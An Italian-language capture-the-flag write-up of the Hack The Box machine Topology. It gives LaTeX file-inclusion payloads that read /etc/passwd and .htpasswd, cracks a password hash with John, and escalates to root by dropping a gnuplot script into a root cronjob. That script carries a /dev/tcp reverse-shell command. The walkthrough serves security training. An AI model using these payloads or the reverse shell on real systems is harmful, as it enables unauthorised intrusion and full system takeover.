**TARGET: 10.10.11.217**

# INFORMATION GATHERING 

Iniziamo con un rapido scan di [Nmap](Note/Tool/Nmap.md)
```shell-session
┌──(root㉿kali)-[/home/kali/htb]
└─# nmap -sT 10.10.11.217
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-17 22:10 CET
Nmap scan report for 10.10.11.217
Host is up (0.053s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.07 seconds
```

andiamo a vedere la versione e provare gli script di nmap sulle porta trovate
```shell-session
┌──(root㉿kali)-[/home/kali/htb]
└─# nmap -sVC -p 22,80 10.10.11.217
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-17 22:11 CET
Nmap scan report for 10.10.11.217
Host is up (0.043s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 dc:bc:32:86:e8:e8:45:78:10:bc:2b:5d:bf:0f:55:c6 (RSA)
|   256 d9:f3:39:69:2c:6c:27:f1:a9:2d:50:6c:a7:9f:1c:33 (ECDSA)
|_  256 4c:a6:50:75:d0:93:4f:9c:4a:1b:89:0a:7a:27:08:d7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Miskatonic University | Topology Group
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect resu
```

un ulteriore scan su tutte le porte non ci da nessuna nuova informatzione.
Quindi facciamo abbiamo:

- 22  ssh     OpenSSH 8.2p1
- 80  http    Apache httpd 2.4.41

Partiamo dalla porta 80 

# ENUMERATION

Visitiamo la pagina web
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/topology.png)
Sembra essere il sito di un università esploriamo un po e vediamo cosa troviamo.
abbiamo solo un link ad LaTeX Equation Generator che non ci porta da nessuna parte

Analizzando il codice sorgente della pagina troviamo un riferimento ad un sottodomino `latex.topology.htb/equation.php` a cui sembra puntare il link di prima 
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/topology1.png)
Aggiungiamo `latex.topology.htb` al nostro `etc/hosts` e andiamo a vedere di cosa si tratta
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/topology2.png)
sembra un applicazione in php per generare un file .PNG.
Vediamo se il codice sorgente ci può ancora dare un mano. 

Troviamo un riferimento ad una directory `/demo` 
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/topology3.png)

se andiamo alla radice abbiamo un po di file

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/topology4.png)

Tra i file troviamo due file `TeX`, tipicamente utilizzati da LaTeX e contenenti il ​​codice sorgente per la creazione di documenti utilizzando il sistema di composizione LaTeX. I file .tex servono come input per il file Compilatore LaTeX, che elabora il codice e produce un documento formattato come output.
Per prima cosa diamo un'occhiata al file equazionetest.tex, poiché sospettiamo che possa rivelare informazioni su come funziona l'effettivo script.php. Il file recita:

```shell-session
\documentclass{standalone}
\input{header}
\begin{document}

$ \int_{a}^b\int_{c}^d f(x,y)dxdy $
\end{document}
```

Non c'è molto da fare in questo file, tuttavia notiamo che include l'altro file TeX che abbiamo visto, vale a dire header.tex , che appare come segue:

```shell-session
% vdaisley's default latex header for beautiful documents
\usepackage[utf8]{inputenc} % set input encoding
\usepackage{graphicx} % for graphic files
\usepackage{eurosym} % euro currency symbol
\usepackage{times} % set nice font, tex default font is not my style
\usepackage{listings} % include source code files or print inline code
\usepackage{hyperref} % for clickable links in pdfs
\usepackage{mathtools,amssymb,amsthm} % more default math packages
\usepackage{mathptmx} % math mode with times font
```

Sono inclusi vari altri pacchetti, ma a giudicare dai commenti, il pacchetto Listings sembra essere il più interessante, poiché può essere utilizzato per includere file di codice sorgente, il che sembra che esista la possibilità di un Local File Inclusion (LFI).
Leggendo la [documentazione](https://ctan.kako-dev.de/macros/latex/contrib/listings/listings.pdf) del pacchetto apprendiamo che il comando \lstinputlisting può essere utilizzato per includere il contenuto di file di testo nell'output LaTeX. Lo usiamo sull'applicazione web, provando ancora una volta a includere il file passwd.

```shell-session
\lstinputlisting{/etc/passwd}
```

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/topology5.png)
Dopo aver inviato il payload, riceviamo un errore che indica che non è stato possibile generare l'immagine.
Ricordiamo che il sito menziona una certa modalità matematica in linea e che sono supportate solo le battute di una riga. Ricercando quella modalità specifica, apprendiamo che è delimitata da \( e \) o da
caratteri $.
Proviamo quindi il seguente payload:
```shell-session
$\lstinputlisting{/etc/passwd}$
```

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/topology6.png)
Bingo abbiamo una [Local File Inclusion LFI](Note/Local%20File%20Inclusion%20LFI.md)

# GAINING AN INITIAL FOOTHOLD 

L'uso di sottodomini come latex.topology.htb è interessante poiché potrebbero esserci più host virtuali (vHost) configurati su questo server web. Utilizziamo LFI per leggere la configurazione Apache predefinita, utilizzando il seguente payload:
```shell-session
$\lstinputlisting{/etc/apache2/sites-available/000-default.conf}$
```
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/topology7.webp)

Questo mostra quattro host, tutti con email amministratore di vdaisley@topology.htb:

- `topology.htb` - root in `/var/www/html`
- `latex.topology.htb` - root in `/var/www/latex` dove è presente l'applcativo 
- `dev.topology.htb` - root in `/var/www/dev`
- `stats.topology.htb` - root in `/var/www/stats`

aggiungiamoli  al nostro `/etc/hosts`

Visitando `dev.topology.htb` ci richiede delle credenziali che al momento non abbiamo, vediamo se riusciamo ad estrarle tramite LFI 
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/topology8.png)

tipicamente su Apache se la password del sito non è configurata nella configurazione del server, viene configurata tramite un file .htaccess. La lettura di /var/www/dev/.htaccess con il seguente payload `$\lstinputlisting{/var/www/dev/.htaccess}$` restituisce:
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/topology9.webp)
La lettura del file ha esito positivo e rivela che le credenziali si trovano nella stessa posizione, all'interno del file `.htpasswd`, che procediamo a leggere con il payload `$\lstinputlisting{/var/www/dev/.htpasswd}$`

Abbiamo un hash 
`vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0`

non ci resta che forzalo con [John The Ripple](Note/Tool/John%20The%20Ripple.md)

```shell-session
┌──(root㉿kali)-[/home/kali/htb/topology]
└─# echo 'vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0' > hash.txt

┌──(root㉿kali)-[/home/kali/htb/topology]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
calculus20       (vdaisley)
1g 0:00:00:09 DONE (2023-12-18 07:27) 0.1054g/s 105032p/s 105032c/s 105032C/s callel..caitlyn09
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Usiamo le credenziali trovate per accedere a `dev.topology.htb`
Il sito riguarda il software sviluppato dal personale dell'università:

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/topology9.png)
Non c’è niente di troppo interessante qui. Gli unici collegamenti tornano a `latex.topology.htb.`

lo scan nmap ci dava la porta 22 ssh aperta proviamo le credenziali anche li 

```shell-session
┌──(root㉿kali)-[/home/kali/htb/topology]
└─# ssh vdaisley@10.10.11.217
The authenticity of host '10.10.11.217 (10.10.11.217)' can't be established.
ED25519 key fingerprint is SHA256:F9cjnqv7HiOrntVKpXYGmE9oEaCfHm5pjfgayE/0OK0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.217' (ED25519) to the list of known hosts.
vdaisley@10.10.11.217's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-150-generic x86_64)


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

vdaisley@topology:~$ id
uid=1007(vdaisley) gid=1007(vdaisley) groups=1007(vdaisley)
vdaisley@topology:~$
```

siamo dentro  e ci prendiamo la nostra user_flag.

```shell-session
vdaisley@topology:~$ cat user.txt
0c2f07364b894df9a4396e472d113fb5
```

# PRIVESC

come sempre una delle prime cosa da vedere e vedere se possiamo eseguire qualcosa come sudo
```shell-session
vdaisley@topology:~$ sudo -l
[sudo] password for vdaisley:
Sorry, user vdaisley may not run sudo on topology
```
niente siamo sfortunati, dobbiamo trovare un altra via

Scarichiamo sulla macchina [[pspy]] per analizzare azioni dei processi e vedere se troviamo qualcosa di interessante .

```shell-session
vdaisley@topology:/tmp$ ./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
                   ░           ░ ░
                               ░ ░

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2023/12/18 06:46:48 CMD: UID=1007  PID=37370  | ./pspy64
2023/12/18 06:46:48 CMD: UID=0     PID=37367  |
2023/12/18 06:46:48 CMD: UID=0     PID=37189  |
2023/12/18 06:46:48 CMD: UID=0     PID=37065  |
2023/12/18 06:46:48 CMD: UID=1007  PID=29083  | /usr/bin/gpg-agent --supervised
2023/12/18 06:46:48 CMD: UID=0     PID=20880  |
2023/12/18 06:46:48 CMD: UID=1007  PID=20332  | -bash
2023/12/18 06:46:48 CMD: UID=1007  PID=20330  | sshd: vdaisley@pts/0

...<snip>...
2023/12/18 06:47:01 CMD: UID=0     PID=37463  | /bin/sh -c /opt/gnuplot/getdata.sh
2023/12/18 06:47:01 CMD: UID=0     PID=37462  | /bin/sh -c /opt/gnuplot/getdata.sh
2023/12/18 06:47:01 CMD: UID=0     PID=37461  | /usr/sbin/CRON -f
2023/12/18 06:47:01 CMD: UID=0     PID=37460  | /usr/sbin/CRON -f
2023/12/18 06:47:01 CMD: UID=0     PID=37466  | /bin/sh -c find "/opt/gnuplot" -name "*.plt" -exec gnuplot {} \;
2023/12/18 06:47:01 CMD: UID=0     PID=37465  | /bin/sh /opt/gnuplot/getdata.sh
2023/12/18 06:47:01 CMD: UID=0     PID=37464  | /bin/sh /opt/gnuplot/getdata.sh
2023/12/18 06:47:01 CMD: UID=0     PID=37469  | find /opt/gnuplot -name *.plt -exec gnuplot {} ;
2023/12/18 06:47:01 CMD: UID=0     PID=37468  | cut -d   -f3,7
2023/12/18 06:47:01 CMD: UID=0     PID=37467  | /bin/sh /opt/gnuplot/getdata.sh
...<snip>...

```

scopriamo un cronjob che sta eseguendo un determinato script getdata.sh all'interno della directory /opt/gnuplot. Fondamentalmente, il cronjob viene eseguito dall'utente root, come indicato dalla colonna UID=0.

Lo script sembra chiamare il successivo comando find, che essenzialmente fa quanto segue:
- Avvia un comando di ricerca utilizzando l'utilità di ricerca.
- La ricerca inizia dalla directory `/opt/gnuplot` .
- Cerca i file con estensione .plt all'interno di quella directory e delle sue sottodirectory.
- Per ogni file trovato, esegue il comando gnuplot `{}` dove `{}` rappresenta il percorso del file trovato.
- Il punto e virgola; alla fine della riga indica la fine del comando exec.

Vediamo se abbiamo i permessi di lettura sulla directory `/opt/gnuplot`
```shell-session
vdaisley@topology:/tmp$ ls -ld /opt/gnuplot/
drwx-wx-wx 2 root root 4096 Jun 14  2023 /opt/gnuplot/
```

Non abbiamo i permessi di lettura, ma abbiamo quelli di scrittura. ma sapiamo che qualsiasi file `.plt` verrà eseguito dal cronjob dell'utente root fornendoci cosi l'opportunità di un'escalation dei privilegi.

Ricerchiamo alcuni comandi [gnuplot](http://gnuplot.info/docs_5.5/Commands.html) e scopriamo che esiste un comando di sistema che esegue comandi di sistema. Uno script gnuplot minimo funzionante che scrive i risultati del comando id, ad esempio, sarebbe simile a questo:
```shell-session
set print "/tmp/output.txt"
cmdout = system("id")
print cmdout
```

Quindi ci salviamo questa PoC , la spostiamo nella directory `/opt/gnuplot` e attendiamo l'attivazione del cronjob.
```shell-session
vdaisley@topology:/tmp$ nano test.plt
vdaisley@topology:/tmp$ mv test.plt /opt/gnuplot/
```

Dopo qualche secondo scopriamo che il file output.txt è stato creato:

```shell-session
vdaisley@topology:/tmp$ cat output.txt
uid=0(root) gid=0(root) groups=0(root) 
```

Avendo confermato che possiamo eseguire comandi di sistema come root, ottenere una shell interattiva è ora banale. Usiamo lo stesso modello di payload e inseriamo un comando che invierà una shell inversa ad [Netcat](Note/Tool/Netcat.md) sulla nostra macchina sulla porta 4444 .

ci mettiamo in ascolto con [Netcat](Note/Tool/Netcat.md)
```shell-session
┌──(root㉿kali)-[/home/kali]
└─# nc -lvnp 4444
listening on [any] 4444 ...
```

creiamo il nostro file.plt con all'interno la nostra revshell
```shell-session
cmdout = system("/bin/bash -c '/bin/sh -i >& /dev/tcp/10.10.14.48/4444 0>&1'")
print cmdout
```

spostiamo il file `.plt` all'interno di `/opt/gnuplot`

```shell-session
vdaisley@topology:/tmp$ mv pwnd.plt /opt/gnuplot/
```

e non ci resta che aspettare che il crojob si attivi per ottenere la nostra shell con la relativa root_flag
```shell-session
┌──(root㉿kali)-[/home/kali]
└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.48] from (UNKNOWN) [10.10.11.217] 46884
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
90c21d7a3ecb0448f06507f42f05ecd8
#
```